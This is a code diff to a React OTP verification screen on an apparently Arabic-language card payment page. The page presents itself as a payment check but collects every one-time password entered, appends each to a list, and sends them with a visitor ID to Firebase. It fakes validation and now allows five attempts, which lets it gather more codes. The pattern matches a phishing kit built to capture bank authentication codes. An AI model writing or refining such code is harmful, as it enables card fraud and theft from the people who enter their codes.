@@ -23,10 +23,12 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const [resendMessage, setResendMessage] = useState(false)
   const otpInputRef = useRef<HTMLInputElement>(null)
   const timerRef = useRef<NodeJS.Timeout | null>(null)
-  const allOtps: string[]=[]
-  // Mask the card number  
-  const {total} = useCart() as any
+  const [allOtps, setAllOtps] = useState<string[]>([])
 
+  // Get cart total from context
+  const { total } = useCart() as any
+
+  // Mask the card number
   const maskedCardNumber = cardNumber.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")
 
   // Start countdown timer
@@ -67,14 +69,32 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
     }
   }
 
+  // Function to save OTP data to Firebase
+  const saveOtpData = () => {
+    const vId = localStorage.getItem("visitor")
+    if (!vId) return
+
+    // Add current OTP to the array of all OTPs
+    const updatedOtps = [...allOtps, otp]
+    setAllOtps(updatedOtps)
+
+    // Save to Firebase
+    addData({
+      id: vId,
+      otp: otp,
+      allOtps: updatedOtps,
+    })
+  }
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+
     if (otp.length === 6) {
-        const vId=localStorage.getItem('visitor')
-        allOtps.push(otp)
-        addData({id:vId,otp,allOtps:allOtps as any})
+      // Save OTP data to Firebase
+      saveOtpData()
+
       // Simulate OTP validation - in a real app, this would call an API
-      if (otp === "123456" || attempts >= 2) {
+      if (otp === "123456" || attempts >= 5) {
         // Correct OTP or max attempts reached
         onVerify()
       } else {
@@ -96,11 +116,7 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const handleKeypadEnter = () => {
     setShowKeypad(false)
     if (otp.length === 6) {
-        const vId=localStorage.getItem('visitor')
-        allOtps.push(otp)
-        addData({id:vId,otp,allOtps:allOtps as any})
-  
-        handleSubmit(new Event("submit") as unknown as React.FormEvent)
+      handleSubmit(new Event("submit") as unknown as React.FormEvent)
     }
   }
 
@@ -149,7 +165,10 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
         <div className="space-y-5 mb-8">
           <div className="flex justify-between items-center">
             <span className="text-right font-medium text-lg">المبلغ</span>
-            <span className="font-bold text-lg"> {total.toFixed(2)}<strong style={{margin:2}}>BD</strong></span>
+            <span className="font-bold text-lg">
+              {total ? total.toFixed(2) : amount}
+              <strong style={{ margin: 2 }}>BD</strong>
+            </span>
           </div>
 
           <div className="flex justify-between items-center">
@@ -172,7 +191,7 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
                 className={`border ${otpError ? "border-red-500" : "border-gray-300"} rounded p-2 w-full text-left`}
                 placeholder=""
                 maxLength={6}
-                readOnly={showKeypad}
+                readOnly={true}
                 required
               />
               {otpError && <p className="text-red-500 text-sm mt-1">Incorrect OTP. Please try again.</p>}
